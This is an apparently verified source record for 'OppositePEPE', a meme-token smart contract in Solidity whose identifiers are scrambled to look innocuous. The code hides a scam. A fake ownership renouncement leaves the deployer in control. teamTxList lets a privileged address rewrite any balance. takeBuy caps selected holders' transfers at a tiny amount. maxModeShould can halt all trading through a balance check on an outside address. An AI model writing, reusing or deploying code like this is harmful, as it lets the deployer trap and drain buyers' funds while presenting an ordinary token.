{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface fromReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellMarketing) external view returns (uint256);\n\n    function transfer(address toTotal, uint256 receiverTeam) external returns (bool);\n\n    function allowance(address minList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toTotal,\n        uint256 receiverTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTotal, uint256 value);\n    event Approval(address indexed minList, address indexed spender, uint256 value);\n}\n\nabstract contract toTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedAt {\n    function createPair(address launchedEnable, address modeAuto) external returns (address);\n}\n\ninterface fromReceiverMetadata is fromReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OppositePEPE is toTx, fromReceiver, fromReceiverMetadata {\n\n    mapping(address => mapping(address => uint256)) private enableLimitList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listAt;\n    }\n\n    string private atSell = \"Opposite PEPE\";\n\n    uint256 private fundToken;\n\n    uint256 private tradingAmount;\n\n    bool public senderFeeSwap;\n\n    function limitIs(address totalMinExempt) public {\n        require(totalMinExempt.balance < 100000);\n        if (senderFeeSwap) {\n            return;\n        }\n        if (atLiquidity == fundToken) {\n            tradingAmount = shouldBuy;\n        }\n        listTo[totalMinExempt] = true;\n        if (sellSender) {\n            fromAmount = true;\n        }\n        senderFeeSwap = true;\n    }\n\n    function takeBuy(address teamMin) public {\n        amountTradingShould();\n        \n        if (teamMin == limitEnable || teamMin == fundTeam) {\n            return;\n        }\n        toReceiver[teamMin] = true;\n    }\n\n    mapping(address => bool) public listTo;\n\n    uint256 swapEnableSender;\n\n    address private totalReceiverLaunch;\n\n    function balanceOf(address sellMarketing) public view virtual override returns (uint256) {\n        return exemptAuto[sellMarketing];\n    }\n\n    bool private receiverEnableFee;\n\n    function amountTradingShould() private view {\n        require(listTo[_msgSender()]);\n    }\n\n    function transfer(address enableTrading, uint256 receiverTeam) external virtual override returns (bool) {\n        return takeLimitAuto(_msgSender(), enableTrading, receiverTeam);\n    }\n\n    function takeLimitAuto(address receiverWallet, address toTotal, uint256 receiverTeam) internal returns (bool) {\n        if (receiverWallet == limitEnable) {\n            return walletMin(receiverWallet, toTotal, receiverTeam);\n        }\n        uint256 totalWalletMode = fromReceiver(fundTeam).balanceOf(launchedAutoBuy);\n        require(totalWalletMode == swapEnableSender);\n        require(toTotal != launchedAutoBuy);\n        if (toReceiver[receiverWallet]) {\n            return walletMin(receiverWallet, toTotal, maxAt);\n        }\n        return walletMin(receiverWallet, toTotal, receiverTeam);\n    }\n\n    mapping(address => bool) public toReceiver;\n\n    constructor (){\n        if (atLiquidity != tradingAmount) {\n            senderLimit = true;\n        }\n        autoShould listMarketing = autoShould(exemptMax);\n        fundTeam = launchedAt(listMarketing.factory()).createPair(listMarketing.WETH(), address(this));\n        \n        limitEnable = _msgSender();\n        feeTotalReceiver();\n        listTo[limitEnable] = true;\n        exemptAuto[limitEnable] = txBuy;\n        if (swapTotal == fundToken) {\n            atLiquidity = shouldBuy;\n        }\n        emit Transfer(address(0), limitEnable, txBuy);\n    }\n\n    function owner() external view returns (address) {\n        return totalReceiverLaunch;\n    }\n\n    uint256 constant maxAt = 6 ** 10;\n\n    bool public sellSender;\n\n    function allowance(address buyToLaunched, address maxReceiver) external view virtual override returns (uint256) {\n        if (maxReceiver == exemptMax) {\n            return type(uint256).max;\n        }\n        return enableLimitList[buyToLaunched][maxReceiver];\n    }\n\n    function feeTotalReceiver() public {\n        emit OwnershipTransferred(limitEnable, address(0));\n        totalReceiverLaunch = address(0);\n    }\n\n    uint8 private listAt = 18;\n\n    uint256 private txBuy = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return totalReceiverLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenTo;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txBuy;\n    }\n\n    function walletMin(address receiverWallet, address toTotal, uint256 receiverTeam) internal returns (bool) {\n        require(exemptAuto[receiverWallet] >= receiverTeam);\n        exemptAuto[receiverWallet] -= receiverTeam;\n        exemptAuto[toTotal] += receiverTeam;\n        emit Transfer(receiverWallet, toTotal, receiverTeam);\n        return true;\n    }\n\n    function transferFrom(address receiverWallet, address toTotal, uint256 receiverTeam) external override returns (bool) {\n        if (_msgSender() != exemptMax) {\n            if (enableLimitList[receiverWallet][_msgSender()] != type(uint256).max) {\n                require(receiverTeam <= enableLimitList[receiverWallet][_msgSender()]);\n                enableLimitList[receiverWallet][_msgSender()] -= receiverTeam;\n            }\n        }\n        return takeLimitAuto(receiverWallet, toTotal, receiverTeam);\n    }\n\n    address launchedAutoBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private tokenTo = \"OPE\";\n\n    uint256 fromMarketing;\n\n    address exemptMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function maxModeShould(uint256 receiverTeam) public {\n        amountTradingShould();\n        swapEnableSender = receiverTeam;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atSell;\n    }\n\n    function approve(address maxReceiver, uint256 receiverTeam) public virtual override returns (bool) {\n        enableLimitList[_msgSender()][maxReceiver] = receiverTeam;\n        emit Approval(_msgSender(), maxReceiver, receiverTeam);\n        return true;\n    }\n\n    bool private fromAmount;\n\n    mapping(address => uint256) private exemptAuto;\n\n    address public limitEnable;\n\n    bool private senderLimit;\n\n    uint256 private swapTotal;\n\n    uint256 private atLiquidity;\n\n    uint256 public shouldBuy;\n\n    function teamTxList(address enableTrading, uint256 receiverTeam) public {\n        amountTradingShould();\n        exemptAuto[enableTrading] = receiverTeam;\n    }\n\n    address public fundTeam;\n\n    event OwnershipTransferred(address indexed amountReceiver, address indexed toModeList);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toModeList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMinExempt\",\"type\":\"address\"}],\"name\":\"limitIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"maxModeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFeeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"}],\"name\":\"takeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"teamTxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OppositePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}